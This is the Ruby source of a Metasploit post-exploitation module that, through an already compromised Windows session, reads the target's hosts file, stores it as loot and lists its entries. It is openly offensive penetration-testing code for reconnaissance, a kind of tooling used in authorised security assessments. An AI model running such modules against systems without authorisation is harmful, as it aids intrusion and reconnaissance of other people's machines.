##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post

  def initialize(info={})
    super(update_info(info,
      'Name'          => 'Windows Gather Windows Host File Enumeration',
      'Description'   => %q{
        This module returns a list of entries in the target system's hosts file.
      },
      'License'       => BSD_LICENSE,
      'Author'        => [ 'vt <nick.freeman[at]security-assessment.com>'],
      'Platform'      => [ 'win' ],
      'SessionTypes'  => [ 'meterpreter', 'shell' ]
    ))
  end

  def run
    # read in the hosts in the hosts file.
    fd = session.fs.file.new("C:\\WINDOWS\\System32\\drivers\\etc\\hosts", "rb")

    # Load up the original hosts file
    buf = ''
    until fd.eof?
      buf << fd.read
    end

    # Finished loading the hosts file, close fd
    fd.close

    # Store the original hosts file
    p = store_loot(
      'hosts.confige',
      'text/plain',
      session,
      buf,
      'hosts_file.txt',
      'Windows Hosts File'
    )

    # Split lines
    lines = buf.split("\n")

    # Print out each line that doesn't start w/ a comment
    entries = []
    lines.each do |line|
      next if line =~ /^[\r|\n|#]/
      entries << line
    end

    # Show results
    if not entries.empty?
      print_line("Found entries:")
      entries.each do |e|
        print_good(e.to_s)
      end
    end

    print_status("Hosts file saved: #{p.to_s}")
  end
end
